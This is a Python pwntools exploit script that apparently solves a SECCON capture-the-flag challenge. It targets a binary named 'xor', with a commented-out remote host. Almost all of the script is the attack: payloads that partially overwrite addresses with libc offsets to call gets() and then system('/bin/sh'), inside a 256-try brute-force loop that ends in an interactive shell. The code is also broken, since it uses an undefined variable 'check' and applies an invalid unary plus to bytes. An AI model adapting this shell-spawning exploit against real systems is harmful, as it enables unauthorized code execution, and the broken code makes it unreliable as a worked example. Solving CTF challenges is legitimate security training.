#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template xor
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('xor')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
bss = 0x404400

system = 0x50d60

gets =  0x805a0

gets=0x40*b'A'
gets+=p64(0) #second arg
gets+=p64(bss) #first arg
gets+=+p8(0xa0)+p16(0x0805) #gets offset into libc(3 bytes)

system = 0x20*b'A'
system+=p64(0) #second arg
system+=p64(bss) #first arg
system+=p8(0x60)+p16(0x050d) # system offset into libc

for i in range(256):

    try:

        io = start()
        #io = remote('selfcet.seccon.games' ,9999)
        io.send(gets) #try call gets

        io.recv(timeout=1)

        io.sendline(b'/bin/sh -') #write to bss

        pause()

        io.send(check) #call system

        io.interactive()

    except EOFError:

        io.close()

        continue
    
